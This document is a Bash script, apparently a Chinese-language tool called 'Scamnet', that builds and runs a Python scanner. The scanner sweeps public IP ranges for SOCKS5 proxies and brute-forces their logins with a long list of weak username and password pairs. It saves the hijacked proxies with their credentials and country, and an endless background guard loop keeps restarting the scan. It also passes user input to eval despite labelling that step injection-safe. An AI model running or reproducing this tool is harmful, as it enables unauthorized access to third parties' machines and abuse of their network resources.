#!/bin/bash
# main.sh - Scamnet OTC v5.0（终极稳定版：防崩溃 + 资源隔离 + 日志轮转 + 重试机制）
set -euo pipefail
IFS=$'\n\t'

# ==================== 颜色 & 日志 ====================
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"
RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
MAX_LOG_SIZE=10485760  # 10MB 轮转
MAX_LOG_FILES=5

log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }

# 日志轮转
rotate_logs() {
    if [ -f "$LATEST_LOG" ] && [ $(stat -c%s "$LATEST_LOG" 2>/dev/null || echo 0) -gt $MAX_LOG_SIZE ]; then
        mv "$LATEST_LOG" "$LATEST_LOG.$(date +%s)"
        find "$LOG_DIR" -name "latest.log.*" | sort | head -n -$MAX_LOG_FILES | xargs rm -f
    fi
}

# ==================== 依赖安装（静默 + 降级兼容） ====================
install_deps() {
    log "安装依赖..."
    for cmd in python3 python; do
        if command -v $cmd >/dev/null 2>&1; then
            PYTHON_CMD=$cmd
            break
        fi
    done
    if [ -z "${PYTHON_CMD:-}" ]; then err "未找到 Python"; exit 1; fi

    $PYTHON_CMD -m pip install --quiet --no-cache-dir --force-reinstall \
        aiohttp tqdm pyyaml || \
    $PYTHON_CMD -m pip install --quiet --no-cache-dir aiohttp tqdm pyyaml

    touch .deps_installed
    succ "依赖安装完成"
}

[ ! -f ".deps_installed" ] && install_deps

# ==================== 输入校验（防注入 + 范围限制） ====================
DEFAULT_START="157.254.32.0"
DEFAULT_END="157.254.52.255"

read_ip() {
    local prompt default var
    prompt="$1"; default="$2"; var="$3"
    echo -e "${YELLOW}$prompt（默认: $default）:${NC}"
    read -r input || exit 1
    eval "$var=\"\${input:-$default}\""
}

read_ip "请输入起始 IP" "$DEFAULT_START" START_IP
read_ip "请输入结束 IP" "$DEFAULT_END" END_IP

# IP 格式 + 范围校验
if ! [[ $START_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || ! [[ $END_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    err "IP 格式错误！"; exit 1
fi

# 跳过本地网段
for ip in "$START_IP" "$END_IP"; do
    if [[ $ip == 10.* || $ip == 172.1[6-9].* || $ip == 172.2[0-9].* || $ip == 172.3[0-1].* || $ip == 192.168.* || $ip == 127.* ]]; then
        err "禁止扫描本地/保留网段: $ip"; exit 1
    fi
done

if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
    err "起始 IP 必须 ≤ 结束 IP！"; exit 1
fi

succ "扫描范围: $START_IP - $END_IP"

# 端口输入
echo -e "${YELLOW}请输入端口（默认: 1080）:${NC}"
echo " 支持格式：1080 / 1080 8080 / 1-65535"
read -r PORT_INPUT || exit 1
PORT_INPUT=${PORT_INPUT:-1080}

PORTS_CONFIG=""
if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
    IFS='-' read p1 p2 <<< "$PORT_INPUT"
    [[ $p1 -ge 1 && $p2 -le 65535 ]] || { err "端口范围非法"; exit 1; }
    PORTS_CONFIG="range: \"$PORT_INPUT\""
elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
    PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
else
    [[ $PORT_INPUT -ge 1 && $PORT_INPUT -le 65535 ]] || { err "端口非法"; exit 1; }
    PORTS_CONFIG="ports: [$PORT_INPUT]"
fi
succ "端口配置: $PORT_INPUT"

# ==================== 生成独立运行脚本（v5.0）===================
cat > "$RUN_SCRIPT" << 'EOF'
#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"

# === 资源限制 ===
ulimit -n 10240  # 文件描述符
ulimit -m $((1024*1024))  # 内存 1GB
ulimit -v $((2*1024*1024))  # 虚拟内存 2GB

# === 变量 ===
START_IP="{{START_IP}}"
END_IP="{{END_IP}}"
PORTS_CONFIG='{{PORTS_CONFIG}}'

# === config.yaml ===
cat > config.yaml << CFG
input_range: "$START_IP-$END_IP"
$PORTS_CONFIG
timeout: 6.0
max_concurrent: 150
batch_size: 250
retry: 2
CFG

# === scanner_batch.py ===
cat > scanner_batch.py << 'PY'
#!/usr/bin/env python3
import asyncio, aiohttp, ipaddress, yaml, sys, signal, os
from tqdm import tqdm

# 优雅退出
def handle_sigterm(*_):
    raise SystemExit(0)
signal.signal(signal.SIGTERM, handle_sigterm)

# 读取参数
if len(sys.argv) != 3:
    print("Usage: scanner_batch.py <start> <end>", file=sys.stderr)
    sys.exit(1)
start_idx, end_idx = int(sys.argv[1]), int(sys.argv[2])

# 加载配置
with open('config.yaml') as f:
    cfg = yaml.safe_load(f)

input_range = cfg['input_range']
raw_ports = cfg.get('ports') or cfg.get('range')
timeout = cfg.get('timeout', 6.0)
max_concurrent = cfg.get('max_concurrent', 150)
retry = cfg.get('retry', 1)

# 解析 IP 和端口
def parse_ip_range(s):
    a, b = s.split('-')
    return [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(a)), int(ipaddress.IPv4Address(b)) + 1)]

def parse_ports(p):
    if isinstance(p, str) and '-' in p:
        a, b = map(int, p.split('-'))
        return list(range(a, b + 1))
    return [int(x) for x in p] if isinstance(p, list) else [int(p)]

ips = parse_ip_range(input_range)
ports = parse_ports(raw_ports)
all_tasks = [(ip, port) for ip in ips for port in ports]
batch = all_tasks[start_idx:end_idx]

# 弱口令字典（精简 + 去重）
WEAK_PAIRS = [
# === 原始列表 ===
    ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
    ("abc","abc"),("aaa","aaa"),("1234","1234"),("socks5","socks5"),("123456","123456"),("12345678","12345678"),("admin123","admin"),
    ("admin","123456"),("12345","12345"),("test","test"),("guest","guest"),("admin",""),("888888","888888"),("test123","test123"),
    ("qwe","qwe"),("11","11"),("222","222"),("2","2"),("3","3"),("12349","12349"),("user","123"),("user","1234"),("user","12345"),
    ("user","123456"),("socks","socks"),("username","username"),("user","pass"),("user","pwd"),("user","password"),("password","password"),
    ("demo","demo"),("fuckyou","fuckyou"),("1239","1239"),("123459","123459"),("1080","1080"),("123","321"),("123","456"),("321","321"),
    ("1234","4321"),("1234","5678"),("12345","54321"),("12345","678910"),("12345","67890"),("123456","654321"),("123456789","123456789"),
    ("123456789","987654321"),("hello","hello"),("abcdefg","abcdefg"),("520","520"),("520","1314"),("s5","s5"),("a","a"),("a","b"),
    ("ab","ab"),("ab","cd"),("aa","bb"),("aa","bb"),("aaa","aaa"),("aaa","bbb"),("aaa","123"),("a123","a123"),("aa123","aa123"),("aaa123","aaa123"),
    ("aa123456","aa123456"),("123aa","123aa"),("123aaa","123aaa"),("123abc","123abc"),("aa","bb"),("aa","bb"),("aa","bb"),("aa","bb"),
    # === 你额外提供的字典（已去重）===
    ("admin","admin"),("12349","12349"),("socks5","socks5"),("socks","socks"),("guest","guest"),("root","root"),
    ("user","user"),("username","username"),("user","pass"),("user","pwd"),("user","password"),("password","password"),
    ("demo","demo"),("test","test"),("fuckyou","fuckyou"),("1239","1239"),("123459","123459"),("1080","1080"),
    ("123","123"),("123","321"),("123","456"),("321","321"),("1234","1234"),("1234","4321"),("1234","5678"),
    ("12345","12345"),("12345","54321"),("12345","678910"),("12345","67890"),("123456","123456"),("123456","654321"),
    ("12345678","12345678"),("12345678","87654321"),("123456789","123456789"),("123456789","987654321"),
    ("hello","hello"),("abcdefg","abcdefg"),("520","520"),("520","1314"),("s5","s5"),("a","a"),("a","b"),
    ("ab","cd"),("aa","bb"),("aaa","bbb"),("aaa","123"),("aaa","aaa"),("a123","a123"),("aa123","aa123"),
    ("aaa123","aaa123"),("aa123456","a123456"),("123aa","123aa"),("123aaa","123aaa"),("123abc","123abc"),
    ("qwq","qwq"),("qaq","qaq"),("qaq","qwq"),("qwq","qaq"),("111","aaa"),("111","222"),("aaa","111"),
    ("123456aa","123456aa"),("abc123","abc123"),("abc","123"),("123","abc"),("1234","abcd"),("12345","abcde"),
    ("123456","abcdef"),("123","qwe"),("1234","qwer"),("12345","qwert"),("123456","qwerty"),("abcde","abcde"),
    ("abc","abc"),("abc","cba"),("abc","def"),("b","b"),("asd","asd"),("as","df"),("asd","fgh"),
    ("qaq","qaq"),("qwq","qwe"),("qwe","123"),("qwer","qwer"),("qwer","1234"),("qwert","qwert"),
    ("qwert","12345"),("qwerty","qwerty"),("qwerty","123456"),("123456","qwert"),("123123","123123"),
    ("123123","abcabc"),("abcabc","123"),("love","love"),("awsl","awsl"),("nmsl","nmsl"),("cnmb","cnmb"),
    ("wsnd","wsnd"),("69","69"),("6969","6969"),("696969","696969"),("qwe","asd"),("qweasd","qweasd"),
    ("0","0"),("00","00"),("000","000"),("0000","0000"),("00000","00000"),("000000","000000"),
    ("1","1"),("a123456","a123456"),("admin","123456"),("11","11"),("111","111"),("1111","1111"),
    ("11111","11111"),("111111","111111"),("2","2"),("22","22"),("222","222"),("2222","2222"),
    ("22222","22222"),("222222","222222"),("3","3"),("33","33"),("333","333"),("3333","3333"),
    ("33333","33333"),("333333","333333"),("4","4"),("44","44"),("444","444"),("4444","4444"),
    ("44444","44444"),("444444","444444"),("5","5"),("55","55"),("555","555"),("5555","5555"),
    ("55555","55555"),("555555","555555"),("6","6"),("66","66"),("666","666"),("6666","6666"),
    ("66666","66666"),("666666","666666"),("7","7"),("77","77"),("777","777"),("7777","7777"),
    ("77777","77777"),("777777","777777"),("8","8"),("88","88"),("888","888"),("8888","8888"),
    ("88888","88888"),("888888","888888"),("9","9"),("99","99"),("999","999"),("9999","9999"),
    ("99999","99999"),("999999","999999"),
    # 重复字母/数字序列
    ("a","a"),("aa","aa"),("aaa","aaa"),("aaaa","aaaa"),("aaaaa","aaaaa"),("aaaaaa","aaaaaa"),
    ("b","b"),("bb","bb"),("bbb","bbb"),("bbbb","bbbb"),("bbbbb","bbbbb"),("bbbbbb","bbbbbb"),
    ("c","c"),("cc","cc"),("ccc","ccc"),("cccc","cccc"),("ccccc","ccccc"),("cccccc","cccccc"),
    ("d","d"),("dd","dd"),("ddd","ddd"),("dddd","dddd"),("ddddd","ddddd"),("dddddd","dddddd"),
    ("e","e"),("ee","ee"),("eee","eee"),("eeee","eeee"),("eeeee","eeeee"),("eeeeee","eeeeee"),
    ("f","f"),("ff","ff"),("fff","fff"),("ffff","ffff"),("fffff","fffff"),("ffffff","ffffff"),
    ("g","g"),("gg","gg"),("ggg","ggg"),("gggg","gggg"),("ggggg","ggggg"),("gggggg","gggggg"),
    ("h","h"),("hh","hh"),("hhh","hhh"),("hhhh","hhhh"),("hhhhh","hhhhh"),("hhhhhh","hhhhhh"),
    ("i","i"),("ii","ii"),("iii","iii"),("iiii","iiii"),("iiiii","iiiii"),("iiiiii","iiiiii"),
    ("j","j"),("jj","jj"),("jjj","jjj"),("jjjj","jjjj"),("jjjjj","jjjjj"),("jjjjjj","jjjjjj"),
    ("k","k"),("kk","kk"),("kkk","kkk"),("kkkk","kkkk"),("kkkkk","kkkkk"),("kkkkkk","kkkkkk"),
    ("l","l"),("ll","ll"),("lll","lll"),("llll","llll"),("lllll","lllll"),("llllll","llllll"),
    ("m","m"),("mm","mm"),("mmm","mmm"),("mmmm","mmmm"),("mmmmm","mmmmm"),("mmmmmm","mmmmmm"),
    ("n","n"),("nn","nn"),("nnn","nnn"),("nnnn","nnnn"),("nnnnn","nnnnn"),("nnnnnn","nnnnnn"),
    ("o","o"),("oo","oo"),("ooo","ooo"),("oooo","oooo"),("ooooo","ooooo"),("oooooo","oooooo"),
    ("p","p"),("pp","pp"),("ppp","ppp"),("pppp","pppp"),("ppppp","ppppp"),("pppppp","pppppp"),
    ("q","q"),("qq","qq"),("qqq","qqq"),("qqqq","qqqq"),("qqqqq","qqqqq"),("qqqqqq","qqqqqq"),
    ("r","r"),("rr","rr"),("rrr","rrr"),("rrrr","rrrr"),("rrrrr","rrrrr"),("rrrrrr","rrrrrr"),
    ("s","s"),("ss","ss"),("sss","sss"),("ssss","ssss"),("sssss","sssss"),("ssssss","ssssss"),
    ("t","t"),("tt","tt"),("ttt","ttt"),("tttt","tttt"),("ttttt","ttttt"),("tttttt","tttttt"),
    ("u","u"),("uu","uu"),("uuu","uuu"),("uuuu","uuuu"),("uuuuu","uuuuu"),("uuuuuu","uuuuuu"),
    ("v","v"),("vv","vv"),("vvv","vvv"),("vvvv","vvvv"),("vvvvv","vvvvv"),("vvvvvv","vvvvvv"),
    ("w","w"),("ww","ww"),("www","www"),("wwww","wwww"),("wwwww","wwwww"),("wwwwww","wwwwww"),
    ("x","x"),("xx","xx"),("xxx","xxx"),("xxxx","xxxx"),("xxxxx","xxxxx"),("xxxxxx","xxxxxx"),
    ("y","y"),("yy","yy"),("yyy","yyy"),("yyyy","yyyy"),("yyyyy","yyyyy"),("yyyyyy","yyyyyy"),
    ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")
]

# 国家查询（双备份 + 缓存）
COUNTRY_CACHE = {}
async def get_country(ip, session):
    if ip in COUNTRY_CACHE: return COUNTRY_CACHE[ip]
    for url in [
        f"http://ip-api.com/json/{ip}?fields=countryCode",
        f"https://ipinfo.io/{ip}/country"
    ]:
        try:
            async with session.get(url, timeout=4) as r:
                if r.status == 200:
                    text = await r.text()
                    code = text.strip().upper()[:2]
                    if len(code) == 2 and code.isalpha():
                        COUNTRY_CACHE[ip] = code
                        return code
        except: pass
    COUNTRY_CACHE[ip] = "XX"
    return "XX"

# SOCKS5 测试（带重试）
async def test_socks5(ip, port, session, auth=None, attempt=0):
    proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
    proxy_url = f"socks5h://{ip}:{port}"
    try:
        async with session.get(
            "http://ifconfig.me/",
            proxy=proxy_url,
            proxy_auth=proxy_auth,
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=False
        ) as r:
            if r.status in (200, 301, 302):
                return True, round(r.elapsed.total_seconds() * 1000), (await r.text()).strip()
    except Exception as e:
        if attempt < retry:
            await asyncio.sleep(0.5)
            return await test_socks5(ip, port, session, auth, attempt + 1)
    return False, 0, None

# 单连接扫描
async def scan(ip, port):
    connector = aiohttp.TCPConnector(limit=8, ssl=False, force_close=True, keepalive_timeout=5)
    async with aiohttp.ClientSession(connector=connector) as session:
        # 无认证
        ok, lat, exp = await test_socks5(ip, port, session)
        if not ok:
            for pair in WEAK_PAIRS:
                ok, lat, exp = await test_socks5(ip, port, session, pair)
                if ok: break
        if ok:
            country = await get_country(exp if exp and exp != ip else ip, session)
            auth_str = f"{pair[0]}:{pair[1]}" if 'pair' in locals() and ok else ""
            result = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
            with open("socks5_valid.txt", "a", encoding="utf-8") as f:
                f.write(result + "\n")
            print(f"[+] {result} ({lat}ms)")

# 主函数
async def main():
    semaphore = asyncio.Semaphore(max_concurrent)
    async def bound_scan(ip, port):
        async with semaphore:
            try:
                await scan(ip, port)
            except Exception as e:
                pass  # 单个失败不影响整体
    tasks = [bound_scan(ip, port) for ip, port in batch]
    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Batch {start_idx}-{end_idx}", unit="conn"):
        await f

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        sys.exit(0)
    except Exception as e:
        print(f"[!] Batch error: {e}", file=sys.stderr)
PY
chmod +x scanner_batch.py

# === 计算任务总数 ===
TOTAL=$(python3 - << 'PYC'
import yaml, ipaddress
c = yaml.safe_load(open('config.yaml'))
s, e = map(ipaddress.IPv4Address, c['input_range'].split('-'))
ips = int(e) - int(s) + 1
p = c.get('ports') or c.get('range')
if isinstance(p, str) and '-' in p:
    a, b = map(int, p.split('-'))
    ports = b - a + 1
elif isinstance(p, list):
    ports = len(p)
else:
    ports = 1
print(ips * ports)
PYC
)

BATCH_SIZE=$(yq e '.batch_size' config.yaml 2>/dev/null || echo 250)
echo "[*] 总任务: $TOTAL | 每批: $BATCH_SIZE"

> socks5_valid.txt
> result_detail.txt
echo "# Scamnet v5.0 - $(date)" > result_detail.txt
echo "# socks5://user:pass@ip:port#CN" > socks5_valid.txt

# === 分批扫描（独立进程 + 超时）===
for ((i=0; i<TOTAL; i+=BATCH_SIZE)); do
    end=$((i + BATCH_SIZE))
    [ $end -gt $TOTAL ] && end=$TOTAL
    echo "[*] 扫描批次 $i → $end"
    timeout 300 python3 scanner_batch.py $i $end || echo "[!] 批次超时或异常"
done

echo "[+] 本轮扫描完成 → socks5_valid.txt"
EOF

# 替换占位符
sed -i "s|{{START_IP}}|$START_IP|g; s|{{END_IP}}|$END_IP|g; s|{{PORTS_CONFIG}}|$PORTS_CONFIG|g" "$RUN_SCRIPT"
chmod +x "$RUN_SCRIPT"

# ==================== 启动守护进程（永不崩溃）===================
echo -e "${GREEN}[*] 启动守护进程...${NC}"
echo " 查看日志: tail -f $LATEST_LOG"
echo " 停止扫描: pkill -f 'scamnet_guard'"

# 守护进程
cat > "$LOG_DIR/scamnet_guard.sh" << 'GUARD'
#!/bin/bash
while true; do
    echo "[GUARD] $(date) - 启动扫描任务..."
    bash "{{RUN_SCRIPT}}" 2>&1 | tee -a "{{LATEST_LOG}}"
    echo "[GUARD] 任务异常退出，3秒后重启..."
    sleep 3
done
GUARD

sed -i "s|{{RUN_SCRIPT}}|$RUN_SCRIPT|g; s|{{LATEST_LOG}}|$LATEST_LOG|g" "$LOG_DIR/scamnet_guard.sh"
chmod +x "$LOG_DIR/scamnet_guard.sh"

# 启动
pkill -f "scamnet_guard.sh" 2>/dev/null || true
nohup bash "$LOG_DIR/scamnet_guard.sh" > /dev/null 2>&1 &

succ "守护进程已启动！PID: $!"
log "日志实时查看：tail -f $LATEST_LOG"
log "停止命令：pkill -f scamnet_guard.sh"
